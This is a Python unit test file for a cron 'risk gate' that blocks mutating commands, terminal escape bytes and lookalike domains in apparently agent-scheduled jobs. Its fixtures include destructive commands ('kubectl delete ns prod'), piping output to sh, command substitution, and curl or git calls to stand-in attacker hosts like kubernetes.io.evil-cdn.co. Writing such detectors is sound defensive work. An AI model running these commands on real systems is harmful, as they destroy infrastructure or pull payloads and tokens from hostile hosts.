"""Unit tests for cron_risk_gate.py (THREAT-002)."""

from __future__ import annotations

import unittest

from cron_risk_gate import (
    cron_command_policy_block,
    cron_content_block,
    cron_execute_code_block,
    find_lookalike_domain,
)


class CronRiskGateTest(unittest.TestCase):
    def test_cron_command_policy_block_allows_read_only_commands_under_high_risk(self):
        reads = [
            "kubectl get nodes -o wide",
            "kubectl -n kube-system get pods",
            "kubectl get pods 2>/dev/null",
            'gcloud compute instances list --filter="status=create"',
            "kubectl create -f x.yaml --dry-run=client -o yaml",
            "kubectl get pods | grep hermes | wc -l",
            "gcloud container clusters describe prod",
            "gh issue list --state open",
            "echo test",
            "cat /var/log/syslog",
        ]
        for cmd in reads:
            with self.subTest(cmd=cmd):
                self.assertIsNone(cron_command_policy_block(cmd, "high"))
                self.assertIsNone(cron_command_policy_block(cmd, None))

    def test_cron_command_policy_block_refuses_mutating_or_unknown_under_high_risk(self):
        mutations = [
            "kubectl delete ns prod",
            "kubectl apply -f x.yaml",
            "kubectl get x && kubectl delete y",
            "kubectl get x -o json | sh",
            "kubectl get $(cat /tmp/verb) pods",
            "terraform apply",
            "kubectl get pods > /tmp/out",
            "gcloud container clusters delete prod",
            "gh issue close 123",
            "find . -name foo",
        ]
        for cmd in mutations:
            with self.subTest(cmd=cmd):
                block = cron_command_policy_block(cmd, "high")
                self.assertIsNotNone(block, f"Expected {cmd} to be blocked under high risk")
                self.assertFalse(block["approved"])
                self.assertIn("SKILL-002", block["message"])

    def test_cron_command_policy_block_allows_mutating_commands_under_low_risk(self):
        self.assertIsNone(cron_command_policy_block("kubectl apply -f x.yaml", "low"))
        self.assertIsNone(cron_command_policy_block("kubectl delete ns prod", "low"))

    def test_cron_execute_code_block_refuses_unconditionally(self):
        block = cron_execute_code_block()
        self.assertIsNotNone(block)
        self.assertFalse(block["approved"])
        self.assertIn("execute_code", block["message"])
        self.assertIn("THREAT-002", block["message"])

    def test_cron_content_block_blocks_terminal_escapes(self):
        # Raw ESC (\x1b)
        block = cron_content_block("echo \x1b[31mRed\x1b[0m")
        self.assertIsNotNone(block)
        self.assertFalse(block["approved"])
        self.assertIn("terminal escape", block["message"])

        # 8-bit C1 control characters (e.g. \x9b single-byte CSI)
        c1_block = cron_content_block("echo \x9b31mRed")
        self.assertIsNotNone(c1_block)
        self.assertFalse(c1_block["approved"])

        c1_erase = cron_content_block("echo \x9bK")
        self.assertIsNotNone(c1_erase)
        self.assertFalse(c1_erase["approved"])

        # Null byte
        block = cron_content_block("cat file\x00extra")
        self.assertIsNotNone(block)
        self.assertFalse(block["approved"])

        # Bell control char
        block = cron_content_block("echo \x07")
        self.assertIsNotNone(block)
        self.assertFalse(block["approved"])

    def test_cron_content_block_allows_ordinary_prose_and_separators(self):
        self.assertIsNone(cron_content_block("ls -la /tmp"))
        self.assertIsNone(cron_content_block("echo 'line 1'\necho 'line 2'"))
        self.assertIsNone(cron_content_block("printf 'col1\tcol2\n'"))
        self.assertIsNone(cron_content_block("echo 'done'\r\n"))

    def test_find_lookalike_domain_detects_tld_evasions(self):
        malicious_commands = [
            ("curl https://kubernetes.io.evil-cdn.co/payload", "kubernetes.io.evil-cdn.co", "kubernetes.io"),
            ("curl 'kubernetes.io.evil-cdn.co'", "kubernetes.io.evil-cdn.co", "kubernetes.io"),
            ("wget \"kubernetes.io.evil-cdn.co\"", "kubernetes.io.evil-cdn.co", "kubernetes.io"),
            ("TARGET=kubernetes.io.evil-cdn.co", "kubernetes.io.evil-cdn.co", "kubernetes.io"),
            ("kubectl --server=kubernetes.io.attacker.com get nodes", "kubernetes.io.attacker.com", "kubernetes.io"),
            ("git clone git@github.com.evil.org:repo.git", "github.com.evil.org", "github.com"),
            ("curl https://googleapis.com.evil.io/token", "googleapis.com.evil.io", "googleapis.com"),
            ("curl https://k8s.io.badguy.org", "k8s.io.badguy.org", "k8s.io"),
            ("curl https://google.com.phishing.xyz", "google.com.phishing.xyz", "google.com"),
            ("curl https://x-k8s.io.evil.com", "x-k8s.io.evil.com", "x-k8s.io"),
            ("curl https://sub.kubernetes.io.evil.com", "sub.kubernetes.io.evil.com", "kubernetes.io"),
            # Chained and special delimiters
            ("TARGETS=a.com,kubernetes.io.evil.co", "kubernetes.io.evil.co", "kubernetes.io"),
            ("curl (kubernetes.io.evil.co)", "kubernetes.io.evil.co", "kubernetes.io"),
            ("curl [kubernetes.io.evil.co]", "kubernetes.io.evil.co", "kubernetes.io"),
            ("curl {kubernetes.io.evil.co}", "kubernetes.io.evil.co", "kubernetes.io"),
            ("bash -c 'curl;kubernetes.io.evil.co'", "kubernetes.io.evil.co", "kubernetes.io"),
            ("curl -X GET|kubernetes.io.evil.co", "kubernetes.io.evil.co", "kubernetes.io"),
        ]
        for cmd, expected_host, expected_apex in malicious_commands:
            with self.subTest(cmd=cmd):
                res = find_lookalike_domain(cmd)
                self.assertIsNotNone(res, f"Expected {cmd} to be detected as lookalike")
                host, apex = res
                self.assertEqual(host, expected_host)
                self.assertEqual(apex, expected_apex)
                block = cron_content_block(cmd)
                self.assertIsNotNone(block)
                self.assertFalse(block["approved"])
                self.assertIn("lookalike domain", block["message"])

    def test_cron_content_block_handles_none_and_empty(self):
        self.assertIsNone(cron_content_block(None))
        self.assertIsNone(cron_content_block(""))
        self.assertIsNone(find_lookalike_domain(None))
        self.assertIsNone(find_lookalike_domain(""))

    def test_find_lookalike_domain_allows_legitimate_domains_and_subdomains(self):
        benign_commands = [
            "curl https://raw.githubusercontent.com/gke-labs/repo/main/x",
            "curl https://storage.googleapis.com/bucket/obj",
            "kubectl get pods -l app.kubernetes.io/name=hermes",
            "kubectl get nodes -l topology.kubernetes.io/zone=us-central1-a",
            "curl https://kubernetes.io/docs",
            "curl https://k8s.io/index.html",
            "curl https://github.com/kubernetes/kubernetes",
            "gcloud container clusters get-credentials test",
            "kubectl describe node.kubernetes.io/instance-type",
            "kubectl get pods -l kubeagents.x-k8s.io/reliability-audit=exempt",
            "kubectl get crd jobset.x-k8s.io",
            "kubectl get crd kueue.x-k8s.io",
            "kubectl get crd secrets-store.csi.x-k8s.io",
            "curl https://github.company.com/internal",
            "curl https://google.company.com/internal",
            '.metadata.labels["addonmanager.kubernetes.io/mode"]',
        ]
        for cmd in benign_commands:
            with self.subTest(cmd=cmd):
                self.assertIsNone(find_lookalike_domain(cmd))
                self.assertIsNone(cron_content_block(cmd))

    def test_cron_content_block_is_unconditional_even_with_scan_opt_out(self):
        cmd = "curl https://kubernetes.io.evil-cdn.co"
        # Default: blocked
        self.assertIsNotNone(cron_content_block(cmd))
        # Even with approvals.cron_scan: False, content blocks remain unconditional
        still_blocked = cron_content_block(
            cmd,
            load_config=lambda: {"approvals": {"cron_scan": False}},
        )
        self.assertIsNotNone(still_blocked)
        self.assertFalse(still_blocked["approved"])

    def test_cron_risk_gate_logging_on_blocks(self):
        with self.assertLogs("cron_risk_gate", level="WARNING") as captured:
            cron_execute_code_block()
            cron_content_block("echo \x1b[31mRed")
            cron_content_block("curl https://kubernetes.io.evil-cdn.co")
            cron_command_policy_block("kubectl delete ns prod", "high")

        output = " ".join(captured.output)
        self.assertIn("Cron risk gate block [execute_code]", output)
        self.assertIn("Cron risk gate block [escape]", output)
        self.assertIn("Cron risk gate block [lookalike]", output)
        self.assertIn("Cron risk gate block [read-only]", output)


if __name__ == "__main__":
    unittest.main()
